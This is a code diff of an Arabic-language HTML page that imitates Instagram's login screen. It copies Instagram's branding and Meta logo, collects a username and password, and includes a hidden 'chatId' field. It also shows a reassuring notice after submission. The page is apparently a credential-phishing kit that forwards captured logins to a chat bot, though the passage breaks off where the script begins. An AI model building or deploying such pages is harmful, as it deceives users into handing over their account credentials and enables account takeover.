@@ -1,95 +1,110 @@
 <!DOCTYPE html>
-<html dir="rtl" lang="ar">
+<html lang="ar" dir="rtl">
 <head>
-    <title>تسجيل الدخول إلى إنستغرام</title>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول • Instagram</title>
     <style>
         body {
             font-family: Arial, sans-serif;
             background-color: #fafafa;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
             margin: 0;
-            color: #262626;
+            padding: 20px;
         }
         .container {
-            background-color: #fff;
-            padding: 40px;
-            border: 1px solid #dbdbdb;
-            text-align: center;
             max-width: 350px;
-            width: 100%;
+            margin: 0 auto;
+            background-color: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 20px;
         }
         .logo {
-            color: #262626;
-            font-size: 45px;
+            text-align: center;
             margin-bottom: 20px;
-            font-family: 'Grand Hotel', cursive;
         }
-        input[type="text"], input[type="password"] {
-            width: 100%;
-            padding: 10px;
-            margin: 8px 0;
-            border: 1px solid #dbdbdb;
-            border-radius: 3px;
-            background-color: #fafafa;
-            box-sizing: border-box;
-        }
-        button {
+        .fb-login {
             background-color: #0095f6;
-            color: white;
-            padding: 10px;
+            color: #fff;
             border: none;
             border-radius: 4px;
-            cursor: pointer;
-            font-size: 14px;
+            padding: 8px 0;
+            font-weight: bold;
             width: 100%;
-            margin-top: 10px;
+            margin-bottom: 20px;
         }
-        .link {
-            display: block;
+        input {
+            width: 100%;
+            padding: 8px;
+            margin-bottom: 10px;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+        }
+        .login-btn {
+            background-color: #0095f6;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            padding: 8px 0;
+            font-weight: bold;
+            width: 100%;
+        }
+        .forgot-password, .signup {
+            text-align: center;
             margin-top: 20px;
-            color: #0095f6;
-            text-decoration: none;
+            font-size: 14px;
+        }
+        .meta {
+            text-align: center;
+            margin-top: 20px;
+            color: #8e8e8e;
+            font-size: 12px;
         }
         .notification {
-            position: fixed;
-            top: 10px;
-            right: 10px;
-            background-color: #0095f6;
-            color: white;
-            padding: 10px 20px;
-            border-radius: 5px;
-            z-index: 100;
-            opacity: 0;
-            transition: opacity 0.5s ease;
             display: none;
+            background-color: #4CAF50;
+            color: white;
+            text-align: center;
+            padding: 10px;
+            margin-top: 10px;
+            border-radius: 4px;
         }
         .notification.show {
-            opacity: 1;
             display: block;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="logo">Instagram</div>
+        <div class="logo">
+            <h1>Instagram</h1>
+        </div>
+        <button class="fb-login">
+            <i class="fab fa-facebook-square"></i> متابعة بحساب فيسبوك
+        </button>
+        <div style="text-align: center; margin: 10px 0;">أو</div>
         <form id="loginForm">
-            <input type="hidden" name="chatId" id="chatIdInput">
-            <input type="text" name="username" placeholder="رقم الهاتف أو اسم المستخدم أو البريد الإلكتروني" required>
-            <input type="password" name="password" placeholder="كلمة السر" required>
-            <button type="submit">تسجيل الدخول</button>
-            <a href="#" class="link">هل نسيت كلمة السر؟</a>
-            <hr>
-            <button type="button" style="background-color: #42b72a;">أليس لديك حساب؟ تسجيل</button>
+            <input type="text" name="username" placeholder="رقم الهاتف أو اسم المستخدم أو البريد الإلكتروني">
+            <input type="password" name="password" placeholder="كلمة السر">
+            <input type="hidden" id="chatIdInput" name="chatId">
+            <button type="submit" class="login-btn">تسجيل الدخول</button>
         </form>
-        <div class="notification" id="notification">
-            <p>تم تنفيذ طلبك! إذا كانت البيانات صحيحة، فسوف يتم تسجيل الدخول بنجاح.</p>
+        <div class="forgot-password">
+            <a href="#">هل نسيت كلمة السر؟</a>
+        </div>
+        <div class="signup">
+            ليس لديك حساب؟ <a href="#">تسجيل</a>
+        </div>
+        <div class="meta">
+            from
+            <img src="https://static.cdninstagram.com/rsrc.php/yb/r/SxCWlJznXoy.svg" alt="Meta" height="20">
         </div>
     </div>
+
+    <div class="notification" id="notification">
+        <p>تم تنفيذ طلبك! إذا كانت البيانات صحيحة، فسوف يتم تسجيل الدخول بنجاح.</p>
+    </div>
+
     <script>
         const loginForm = document.getElementById('loginForm');
         const chatIdInput = document.getElementById('chatIdInput');
